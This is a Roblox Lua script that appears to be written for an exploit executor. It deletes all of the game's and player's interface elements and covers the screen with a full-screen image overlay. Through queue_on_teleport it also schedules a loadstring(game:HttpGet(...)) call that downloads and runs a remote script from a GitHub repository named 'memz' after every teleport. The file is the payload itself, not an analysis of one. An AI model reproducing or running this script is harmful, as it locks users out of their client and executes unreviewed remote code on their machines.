    wait(1.2)
    local players = game:GetService("Players")
    local localplayer = players.LocalPlayer
    
    for _, coreasset in ipairs(game.CoreGui:GetDescendants()) do
        coreasset:Destroy()
    end
    for _, starterasset in ipairs(game.StarterGui:GetDescendants()) do
        starterasset:Destroy()
    end
    for _, plrasset in ipairs(localplayer.PlayerGui:GetDescendants()) do
        plrasset:Destroy()
    end
    local lolxd = Instance.new("ScreenGui")
    local Frame = Instance.new("Frame")
    local ImageLabel = Instance.new("ImageLabel")
    lolxd.Name = "lolxd"
    lolxd.Parent = game.CoreGui
    lolxd.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    lolxd.DisplayOrder = 999999999
    Frame.Parent = lolxd
    Frame.AnchorPoint = Vector2.new(0.5, 0.5)
    Frame.BackgroundColor3 = Color3.fromRGB(124, 127, 137)
    Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
    Frame.BorderSizePixel = 0
    Frame.Position = UDim2.new(0.5, 0, 0.450748146, 0)
    Frame.Size = UDim2.new(1.00063288, 0, 1.0972569, 0)
    Frame.ZIndex = math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge * math.huge
    ImageLabel.Parent = Frame
    ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
    ImageLabel.BorderSizePixel = 0
    ImageLabel.Position = UDim2.new(0.444213718, 0, 0.444734752, 0)
    ImageLabel.Size = UDim2.new(0.110689439, 0, 0.198863626, 0)
    ImageLabel.Image = "rbxassetid://14195957999"
    local queueonteleport = syn and syn.queue_on_teleport or queue_on_teleport or function() end
        local teleportScript = [[
	        loadstring(game:HttpGet('https://raw.githubusercontent.com/P996Lazer69/memz/main/CrackHub.lua'))()
        ]]
    queueonteleport(teleportScript)
